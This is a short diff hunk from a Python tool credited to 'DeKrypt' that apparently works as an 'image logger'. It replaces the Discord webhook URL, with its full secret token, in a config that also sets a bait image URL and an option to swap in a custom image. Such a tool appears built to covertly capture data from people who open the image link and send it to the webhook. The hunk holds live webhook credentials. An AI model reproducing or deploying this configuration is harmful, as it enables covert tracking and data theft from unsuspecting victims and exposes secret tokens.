@@ -9,7 +9,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1221579382385279076/ddJvfnAFfohhM8bA1ekfIDi94GqAd45PzBIlrMg3RWl0VrLNWkhLv1WshUmLdqDesH2m",
+    "webhook": "https://discord.com/api/webhooks/1376246161400135771/GCCl9EQSUI8oe_7-Lgf0s8_fuIMJ0cA25dU4E0sgbzCdLyoFCjiJSkwQVCWBo4CLW0Js",
     "image": "https://glavpirog.ru/wp-content/uploads/2017/10/chernika.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
